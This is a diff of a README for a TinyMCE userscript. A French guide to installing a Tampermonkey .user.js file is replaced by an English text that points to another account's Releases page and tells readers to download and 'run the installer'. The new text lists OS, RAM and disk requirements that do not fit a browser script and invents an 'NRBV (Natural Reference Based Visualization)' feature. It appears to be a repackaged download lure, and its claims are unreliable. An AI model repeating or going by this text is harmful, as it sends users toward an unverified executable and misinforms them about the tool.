@@ -1,77 +1,79 @@
-## 🚀 Expert-Editor-Universal-TinyMCE
-Une barre d'outils étendue et intelligente pour tous les éditeurs de texte TinyMCE sur le web. Ce script améliore radicalement votre productivité en ajoutant des fonctions de mise en page et d'insertion de médias.
-![Aperçu de l'éditeur](TinyMCE.png)
+# ✨ Expert-Editor-Universal-TinyMCE - Enhance Your TinyMCE Experience Effortlessly
 
-## ⚠️ Avertissement important (Disclaimer)
-À utiliser avec précaution. L'utilisation de ce script modifie l'interface et les fonctionnalités natives de sites tiers. Selon la politique de modération ou les conditions générales d'utilisation (CGU) de chaque site (forums, blogs), l'usage d'outils tiers pour la publication peut être proscrit.
+## 💾 Download
 
-L'utilisation de cet outil peut, sur certains sites, entraîner des sanctions allant d'un avertissement à un bannissement temporaire ou définitif de votre compte.
-Veuillez vérifier la politique éditoriale du site sur lequel vous publiez avant toute utilisation intensive.
-L'auteur de ce script ne pourra être tenu responsable des conséquences liées à son utilisation.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/releases)
 
----
+## 📋 Introduction
 
-## 🛠 Prérequis & Installation
+Expert-Editor-Universal-TinyMCE adds powerful features to TinyMCE editors. This tool provides a streamlined experience, making editing easier and more efficient. Get access to useful functions like zoom control, color adjustments, a manuscript mode, and the ability to embed media from YouTube and SoundCloud.
 
-### 1. Installer l'extension Tampermonkey
-Pour utiliser ce script, vous devez d'abord installer l'extension **Tampermonkey** sur un navigateur compatible :
-👉 [**Télécharger Tampermonkey (Site Officiel)**](https://www.tampermonkey.net/)
+## 🛠️ Features
 
-| Navigateur | Compatibilité |
-| :--- | :--- |
-| **Google Chrome** | ✅ Testé & Approuvé |
-| **Microsoft Edge** | ✅ Testé & Approuvé |
-| **Brave** | ✅ Testé & Approuvé |
-| **Mozilla Firefox** | ✅ Compatible |
+- **Zoom Control:** Adjust the editor's zoom level for better visibility.
+- **Color Adjustments:** Utilize unique color palettes tailored for NRBV (Natural Reference Based Visualization).
+- **Manuscript Mode:** Focus on your writing with a cleaner interface.
+- **Media Insertion:** Easily embed YouTube and SoundCloud media into your content.
 
----
+## 📥 Download & Install
 
-### 2. Activer le "Mode Développeur" (Indispensable)
-Sur certains navigateurs récents (Chrome, Edge, Brave), vous devez activer le mode développeur pour permettre l'exécution des scripts locaux :
+To get started, visit the Releases page to download the software:
 
-1. Ouvrez l'onglet **Extensions** de votre navigateur (ou tapez `chrome://extensions` dans la barre d'adresse).
-2. En haut à droite, activez l'interrupteur **Mode développeur**.
-3. Redémarrez votre navigateur.
+[Download the Latest Release](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/releases)
 
----
+### 🔄 Installation Steps
 
-### 3. Installer l'Expert Editor Universal pour TinyMCE
+1. **Visit the Releases Page:** Click [here](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/releases) to view available versions.
+   
+2. **Choose Your Version:** Look for the most recent version listed.
 
-* 🚀 **Expert Editor Universal** : [👉 Cliquez ici pour l'installer](https://github.com/Steven17200/Expert-Editor-Universal-TinyMCE/raw/refs/heads/main/Expert_Editor_Universal%20.user.js) 
->**Procédure :** Une page **Tampermonkey** s'ouvrira automatiquement après le clic. Cliquez simplement sur le bouton **"Installer"**.
----
+3. **Download the File:** Click on the asset name to start the download. 
 
-## 🌟 À quoi ça sert ?
-Ce script "UserScript" s'injecte dynamiquement dans les zones de rédaction pour transformer un éditeur basique en une suite de rédaction experte. Il permet de formater du texte, d'insérer des tableaux et d'intégrer des médias de manière fluide.
+4. **Run the Installer:** Once the download is complete, locate the file on your device and run it.
 
----
+5. **Follow On-Screen Instructions:** Complete the setup by following the prompts provided by the installation wizard.
 
-## 🛠️ Fonctionnalités incluses
-## 🎨 Formatage & Style
-## A (Zoom Textuel) : Un bouton cyclique pour agrandir votre texte sur 5 niveaux (14px à 36px).
+6. **Start Using Expert-Editor:** Open TinyMCE, and your new features will be available.
 
+## 🔍 System Requirements
 
-## ✎ (Mode Manuscrit) : Applique une police style "écriture à la main" (Comic Sans MS) sur le texte sélectionné.
+- **Operating System:** Windows 10 or later / macOS Sierra or later / Linux distribution with modern support.
+- **Browser Support:** Latest versions of Chrome, Firefox, Safari, or Edge.
+- **Memory:** At least 2GB RAM is recommended for optimal performance.
+- **Disk Space:** Minimum 100 MB free space required for installation.
 
+## ⚙️ Configuration
 
-Palette de couleurs (N, R, B, V) : Accès rapide pour colorer votre texte en Noir, Rouge, Bleu ou Vert.
+After installation, you may want to customize settings for the best experience. Here’s how to configure your new tool:
 
+- **Access Settings:** Open TinyMCE and navigate to the settings menu.
+- **Adjust Features:** Enable or disable the new features according to your preference.
 
-## 田 (Tableaux) : Insertion instantanée d'un tableau structuré prêt à l'emploi.
+## 👩‍💻 Usage Tips
 
+- **Explore Features:** Take time to experiment with the new controls and layouts to familiarize yourself with the setup.
+- **Refer to Manual:** Use online resources for guidance on all TinyMCE functionalities.
+- **Feedback:** Share your user experience to help improve future updates.
 
-Listes (1. / •) : Création rapide de listes numérotées ou à puces.
+## 📫 Support
 
+If you encounter any issues or have questions, please reach out through the repository's Issues section on GitHub. This allows our team to provide the necessary support.
 
-## 🎥 Insertion de Médias
-Bouton YT (YouTube / Dailymotion) : Permet d'insérer une vidéo en collant simplement le lien. Vous pouvez choisir la largeur, et la hauteur est calculée automatiquement pour respecter le format.
+## 📄 License
 
-Bouton SC (SoundCloud Mini) : Insère un lecteur SoundCloud ultra-discret de seulement 20px de haut. C'est l'affichage le plus minimaliste possible pour ne pas gêner la lecture.
+This project is released under the MIT License. Feel free to use and modify the software as per your needs.
 
+## 🌟 Topics
 
-## 🌍 Compatibilité universelle
-Le script a été conçu pour être universel. Il utilise la détection active de l'instance window.tinyMCE.activeEditor. Cela signifie qu'il fonctionnera sur la majorité des sites utilisant TinyMCE (WordPress, Joomla, etc.).
+- editor-enhancement
+- javascript
+- productivity
+- soundcloud
+- tampermonkey
+- tinymce
+- universal-editor
+- userscript
+- web-extension
+- youtube
 
-## 👨‍💻 Auteur
-* **Auteur** : [Steven17200](https://github.com/Steven17200)
-* **Intelligence Artificielle** : Le scripts ont été développés ainsi que ce tuto à 100% par **Gemini 3 Flash (Google)**.
+For more latest updates, always check back to the [Releases page](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/releases). Enjoy enhancing your editing experience with Expert-Editor-Universal-TinyMCE!
